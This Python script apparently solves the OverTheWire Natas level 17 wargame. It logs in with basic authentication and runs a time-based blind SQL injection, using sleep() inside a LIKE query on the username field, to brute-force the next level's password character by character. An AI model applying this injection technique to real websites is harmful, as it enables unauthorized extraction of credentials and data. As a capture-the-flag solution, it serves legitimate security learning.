import requests
import sys
import argparse
import re
import time

# Function to perform login with basic authentication
def login(url, user, password, session, proxies=None):
    print(f"[+] Logging in as {user}...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = session.get(url, auth=(user, password), proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)
    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)

def sqli(url, user, password, session, proxies=None):
    print("[+] Performing time-based SQL injection to retrieve the password...")
    time.sleep(1)

    passwd = ''
    alphanum = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    while len(passwd) != 32:
        for i in alphanum:
            payload = f'" and (select sleep(3) from users where username="natas18" and BINARY password like "{passwd}{i}%") -- -'
            data = {"username": payload}
            response = session.post(url, auth=(user, password), data=data, proxies=proxies)
            if response.elapsed.total_seconds() > 3 :
                passwd += i
                sys.stdout.write('\r')
                sys.stdout.write("[+] The password of natas18 is: " + passwd)
                sys.stdout.flush()
                break



def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas18 by exploiting a blind sql injection.")
    parser.add_argument('-p', '--password', help='Password of Natas17.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    user = 'natas17'
    url = f'http://{user}.natas.labs.overthewire.org'
    password = args.password
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    session = requests.Session()
    # Check if proxy option is enabled and perform login
    if args.proxy:
        login(url, user, password, session, proxies=proxies)
        sqli(url, user, password, session, proxies=proxies)

    else:
        login(url, user, password, session)
        sqli(url, user, password, session)
    
if __name__ == "__main__":
    main()
